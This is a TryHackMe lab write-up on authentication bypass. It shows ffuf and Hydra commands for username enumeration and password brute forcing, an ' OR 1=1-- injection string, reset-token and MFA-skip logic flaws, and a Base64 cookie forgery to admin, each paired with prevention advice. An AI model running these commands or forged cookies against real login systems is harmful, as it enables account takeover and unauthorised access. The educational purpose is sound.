# TryHackMe — Broken Authentication

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=flat&logo=tryhackme&logoColor=white)
![Path](https://img.shields.io/badge/Path-Jr%20Penetration%20Tester-red)
![Topic](https://img.shields.io/badge/Topic-Authentication%20Bypass-red)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Date](https://img.shields.io/badge/Completed-June%202026-purple)

---

## Overview

| Field | Details |
|-------|---------|
| Room | Broken Authentication |
| Path | Jr Penetration Tester → Web Application Vulnerabilities |
| Tasks | Task 1 — Task 7 (all, 100%) |

---

## Tasks Completed

| Task | Topic |
|------|-------|
| Task 1 | Introduction |
| Task 2 | Types of Authentication Bypass |
| Task 3 | Username Enumeration |
| Task 4 | Brute Forcing a Login Form |
| Task 5 | Logic Flaws |
| Task 6 | Cookie Manipulation |
| Task 7 | Conclusion |

---

## Task 2 — Types of Authentication Bypass

Authentication bypass means gaining access without valid credentials. Common categories:

| Type | Method |
|------|--------|
| **Username enumeration** | Discover valid usernames from error message differences |
| **Brute force** | Try many passwords against a known username |
| **Logic flaws** | Exploit flawed authentication workflow design |
| **Cookie manipulation** | Modify client-side session/auth data the server trusts |
| **Default credentials** | Try admin:admin, admin:password on common systems |
| **SQL injection** | `' OR 1=1--` to bypass the WHERE clause |

---

## Task 3 — Username Enumeration

Applications often leak whether a username exists through different error messages:

```
Valid username, wrong password:   "Incorrect password"
Invalid username:                 "User does not exist"
```

This difference lets an attacker build a confirmed list of valid usernames before attempting any passwords.

**Using ffuf for username enumeration:**
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&password=wrongpassword" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.thm/login \
     -mr "username already exists"
```

**Using Burp Intruder:**
```
1. Capture login POST request → Send to Intruder
2. Mark username parameter as position: username=§FUZZ§
3. Attack type: Sniper
4. Payload: username wordlist
5. Filter results by response length — different length = valid username
```

**Prevention:** Always return identical error messages for invalid username and invalid password: "Username or password incorrect."

---

## Task 4 — Brute Forcing a Login Form

Once a valid username is confirmed, brute force the password.

**Using ffuf:**
```bash
ffuf -w /usr/share/wordlists/rockyou.txt \
     -X POST \
     -d "username=admin&password=FUZZ" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://target.thm/login \
     -mr "Incorrect password" \
     -fc 200
```

**Using Hydra:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form \
      "target.thm/login:username=^USER^&password=^PASS^:Incorrect password"
```

**What makes brute force possible:**
- No account lockout after N failed attempts
- No CAPTCHA or rate limiting
- No MFA requiring a second factor even after correct password

---

## Task 5 — Logic Flaws

Logic flaws in authentication don't require guessing passwords — they exploit design mistakes in the authentication workflow itself.

### Password Reset Flaws

**Example — predictable reset token:**
```
Password reset URL: http://target.thm/reset?token=1234567890

Token is a timestamp (Unix epoch) — predictable if the request time is known.
Brute force the token in a small window around the request time.
```

**Example — reset token not invalidated after use:**
```
Request reset link → receive token via email → use token to reset password
→ Reuse the same token again an hour later → still works
```

**Example — reset link sent to attacker-controlled email:**
```
POST /reset-password
{"email": "victim@company.com", "new_email": "attacker@evil.com"}
→ If the app changes the email before sending the reset, attacker receives the link
```

### Multi-step Authentication Bypass

Some applications split authentication into steps but don't validate that all steps were completed:

```
Step 1: /login    → POST username + password → success → redirect to Step 2
Step 2: /verify   → POST MFA code → success → authenticated

Logic flaw: Directly navigating to /dashboard after Step 1
without completing Step 2 — if the app doesn't check Step 2 completion,
authentication is bypassed entirely.
```

---

## Task 6 — Cookie Manipulation

Applications that store user identity or role in a client-side cookie without server-side validation are exploitable.

### What I did

```
1. Logged in with test credentials
2. Intercepted the response in Burp — examined the Set-Cookie header
3. Found: Cookie: user=dXNlcg==
4. Decoded Base64: dXNlcg== → "user"
5. Encoded "admin" → Base64: YWRtaW4=
6. Modified cookie in Burp Repeater: Cookie: user=YWRtaW4=
7. Sent modified request → server accepted it
8. Gained admin access without ever having admin credentials
```

**Why this works:** The application trusted the role stored in the cookie without verifying it against a server-side record. The cookie was the only thing distinguishing a regular user from an admin.

**Logged in as admin with no account — just by manipulating the cookie.**

### Testing cookie values systematically

```bash
# Decode common encodings
echo "dXNlcg==" | base64 -d           # Base64
python3 -c "import urllib.parse; print(urllib.parse.unquote('user%3Dadmin'))"  # URL decode

# Check if cookie is a JWT
# JWTs have three Base64url parts separated by dots: header.payload.signature
echo "eyJ..." | base64 -d            # Decode header/payload
```

---

## Authentication Attack Chain

```
Step 1: Username enumeration
        → ffuf with username wordlist → identify valid accounts

Step 2: Brute force
        → hydra with rockyou.txt → find password for valid user

Step 3: Logic flaw testing
        → skip MFA step → directly access authenticated area

Step 4: Cookie manipulation
        → decode cookie → modify role to admin → re-encode → gain admin access
```

---

## Key Takeaways

- **Error message consistency breaks enumeration** — always return the same message for wrong username and wrong password
- **Rate limiting + lockout defeats brute force** — MFA defeats it entirely
- **Logic flaws require manual testing** — automated scanners don't understand multi-step workflow bypasses
- **Never trust client-side data for authorisation** — cookies, localStorage, hidden fields — any client-controlled value can be modified
- **Cookie manipulation to admin with no credentials is a Critical finding** — if role or identity is stored in an unprotected client-side cookie, the entire authentication system is bypassed

---

*Part of my 6-month cybersecurity portfolio — [github.com/shehrozmajeed](https://github.com/shehrozmajeed)*
